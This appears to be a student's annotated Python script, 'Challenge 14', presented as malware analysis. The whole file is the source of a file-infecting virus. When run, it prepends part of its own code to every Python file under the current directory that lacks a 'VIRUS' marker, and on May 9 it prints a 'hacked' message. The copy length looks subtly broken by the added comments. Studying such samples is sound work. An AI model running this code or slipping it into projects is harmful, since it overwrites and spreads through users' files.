#!/usr/bin/python3

# Script Name:                  Challenge 14
# Author:                       Mack Dirks
# Date of latest revision:      06/19/2023
# Purpose:                      Python Malware Analysis

import os
import datetime

# Main

# Defines a constant "signature" and assigns it "virus"
SIGNATURE = "VIRUS"

# Defines a function called "locate" that takes "path as a parameter"
# The function searches for all the python files and checks if they have the virus
def locate(path):
    # Creates an empty list
    files_targeted = []
    # Saves names of the files into the list
    filelist = os.listdir(path)
    # If a name in the list is a directory, checks if this directory includes any python files
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        # Checks all the python files in the list whether they include the "signature" or not. 
        # If they do, the flag is set to "true"
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            # If a file doesn't include "signature", the flag is set to "false", and the file's path is added to the "files_targeted" list
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# Function called"infect" that takes the list of targeted files as its parameter
# It creates a "virusstring" by linking together the first 39 lines of the file and adds a string from the virus script to these files
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# Function that checks the current month and date
# If it is May 9th, prints the message "You have been hackt" to the screen
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# Function "locate" is called to find targeted files in the current directory and save them in the "files_targeted" list
files_targeted = locate(os.path.abspath(""))
# Function "infect" is called to add the virus code to the targeted files
infect(files_targeted)
# Function "detonate" is called to check the current day and month. It prints "You have been hacked" message if it is May 9th
detonate()

# End